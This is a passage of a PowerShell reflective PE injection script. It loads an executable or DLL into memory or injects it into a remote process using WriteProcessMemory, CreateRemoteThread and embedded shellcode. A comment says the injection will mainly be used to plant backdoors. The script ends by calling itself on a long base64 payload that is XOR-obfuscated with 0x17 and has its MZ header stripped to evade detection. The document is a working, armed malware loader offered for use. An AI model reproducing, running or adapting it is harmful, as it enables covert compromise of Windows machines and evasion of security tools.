		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = 	Get-Win32Functions
		$Win32Types = 		Get-Win32Types
		$Win32Constants =  	Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes  -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
				
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
				Write-Verbose "Calling function with WString return type"
				[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $Func
				if ($WStringFuncAddr -eq [IntPtr]::Zero)
				{
					Throw "Couldn't find function address."
				}
				$WStringFuncDelegate = Get-DelegateType @() ([Int32])
				$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				[IntPtr]$OutputPtr = $WStringFunc.Invoke()
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	#{
    [Byte[]]$PEBytes = [System.Convert]::FromBase64String($PEBytes)
	
	for ($i = 0; $i -lt $PEBytes.Count; $i++)
	{
		$PEBytes[$i]=$PEBytes[$i] -bXOR 0x17
	}
	#[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	#}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    $PEBytes[0] = 0
    $PEBytes[1] = 0

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $Func, $ProcId,$ForceASLR)
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX9xcXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxcNqnsJScsVWknLFVpJyxVa2oWNWkvLFVpSVotaXMsVWlJWv1o6yxVaQLOGWkbLFVpJyxRaI8sVWlJWvlpkyxVaUlaOWkjLFVpSVohaSMsVWkV+dH9JyxVaFxcXFxcXFxdHUhcXWxYTF6zP6E0XFxcXFxcXF/cXFTYcFh0XFw8WFxeFFxcXFxcXwZQXFxcHFxcXJxYXFxcXBxcHFxcXFRcXEhcWFxcXFxcSFxYXFxcXFxf3FhcXExcXFxcXFxUXVxYXFwcXFwcXFxcXBxcXBxcXFxcXFwcXFxeXZhYXdxcXF3t/FhebFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF9cWF78HFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF79OFhdXFxcXFxcXFxcXFxcXJxYXmxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzljcm9jFxcXNgAWFxcHFxcXDxYXFxMXFxcXFxcXFxcXFxcXFzcXF3c5ZXN2Y3YXF/dWFxcXJxYXF1UXFxcLFhcXFxcXFxcXFxcXFxdXFxdXOXN2Y3YXFxcbJRcXF5cWFxcFFxcXSRYXFxcXFxcXFxcXFxcXVxcX1zllcnt4dBcXWwwXFxfXFhcXCxcXF2cWFxcXFxcXFxcXFxcXF1cXF1UXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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